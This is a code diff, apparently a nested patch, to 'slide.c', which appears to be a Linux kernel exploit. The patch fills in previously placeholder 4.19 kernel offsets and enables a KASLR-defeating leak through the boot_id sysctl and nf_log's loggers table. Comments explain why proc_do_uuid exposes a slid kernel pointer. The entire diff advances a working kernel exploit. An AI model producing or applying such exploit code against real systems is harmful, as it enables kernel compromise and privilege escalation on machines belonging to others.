@@ -304,7 +304,7 @@
      uintptr_t head = direct_to_head_page(fd, page);
 --- a/slide.c
 +++ b/slide.c
-@@ -402,7 +402,76 @@
+@@ -402,7 +402,77 @@
    return slide_read_stext();
  }
  
@@ -374,9 +374,10 @@
 +    return 1;
 +  }
 +#ifdef CFGOPS_4_19_STYLE
-+  pr_warning("slide: no KASLR leak available; bootid rb-gadget disabled on "
-+             "4.19 (placeholder values would panic)\n");
-+  return 0;
++  pr_warning("slide: bootid rb-gadget values derived for 4.19 "
++             "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
++             (unsigned long long)SLIDE_LOGGERS_0_1,
++             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
 +#endif
    for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
@@ -573,8 +574,12 @@
 +#define SLIDE_SYSCTL_BOOTID_OFF 0x032de2c4ULL           /* [A] sysctl_bootid */
 +#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 +#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
-+#define SLIDE_LOGGERS_0_1_OFF 0x0ULL                    /* TODO: derive on 4.19 (round 2) */
-+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0ULL            /* TODO: derive on 4.19 (round 2) */
++/* [B] loggers[0][0] (nf_log.c) == nfulnl_logger - 0xd8; content = &nfulnl_logger
++ *     (nfnetlink_log registers NFPROTO_UNSPEC). RELA-verified boot_id sysctl
++ *     entry .data slot = 0x2e33f68 (proc_do_uuid outputs table->data content
++ *     when data[8]!=0 -> leaks the slid pointer). */
++#define SLIDE_LOGGERS_0_1_OFF 0x02d92208ULL
++#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02e33f68ULL
 +#define SLIDE_WONLY_BOOTID 1                            /* [D] confirm */
 +
 +#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
